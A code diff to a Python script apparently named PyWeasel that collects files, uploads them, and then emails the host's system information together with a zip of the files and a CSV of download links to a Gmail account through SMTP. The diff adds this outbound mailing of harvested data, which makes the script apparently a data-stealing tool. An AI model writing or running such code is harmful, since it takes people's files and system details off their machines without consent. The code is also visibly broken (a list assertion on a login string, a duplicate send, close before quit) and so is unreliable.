@@ -2,7 +2,13 @@ import argparse
 import datetime
 import os
 import smtplib
-from helpers import csv_manager, filemanager
+from email.mime.application import MIMEApplication
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.utils import formatdate
+from smtpd import COMMASPACE
+
+from helpers import csv_manager, filemanager, utils
 
 
 def main(arguments):
@@ -70,25 +76,52 @@ def main(arguments):
         dl_links = filemanager.send_files(arguments.url)
         csv_manager.update_dl_link(dl_links)
 
-    if arguments.email and arguments.email.strip() and arguments.password and arguments.password.strip():
-        sendmail(arguments.email, arguments.password, "pyweasel\'s gift")
-
     # Si l'argument zip existe et n'est pas vide
+    zipfile = None
     if arguments.zip and arguments.zip.strip():
-        filemanager.zip_files()
+        zipfile = filemanager.zip_files()
+
+    if arguments.email and arguments.email.strip() and arguments.password and arguments.password.strip():
+        if zipfile is not None:
+            sendmail(arguments.email, arguments.password, utils.system_information(), [zipfile, csv_manager.FILENAME])
+        else:
+            sendmail(arguments.email, arguments.password, utils.system_information(), [csv_manager.FILENAME])
 
 
-def sendmail(email, password, message='', file=None):
+def sendmail(email, password, message='', files=None):
+    assert isinstance(email, list)
+
+    msg = MIMEMultipart()
+    msg['From'] = email
+    msg['To'] = COMMASPACE.join(email)
+    msg['Date'] = formatdate(localtime=True)
+    msg['Subject'] = 'PyWeasel - ' + msg['Date']
+
+    msg.attach(MIMEText(message))
+
+    for f in files or []:
+        with open(f, "rb") as fil:
+            part = MIMEApplication(
+                fil.read(),
+                Name=os.path.basename(f)
+            )
+        # After the file is closed
+        part['Content-Disposition'] = 'attachment; filename="%s"' % os.path.basename(f)
+        msg.attach(part)
+
+
     # manages a connection to an SMTP server
-    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+    smtp = smtplib.SMTP(host="smtp.gmail.com", port=587)
     # connect to the SMTP server as TLS mode ( for security )
-    server.starttls()
+    smtp.starttls()
     # login to the email account
-    server.login(email, password)
+    smtp.login(email, password)
+    smtp.sendmail(email, email, msg.as_string())
     # send the actual message
-    server.sendmail(email, email, message)
+    smtp.sendmail(email, email, message)
     # terminates the session
-    server.quit()
+    smtp.close()
+    smtp.quit()
 
 
 if __name__ == '__main__':
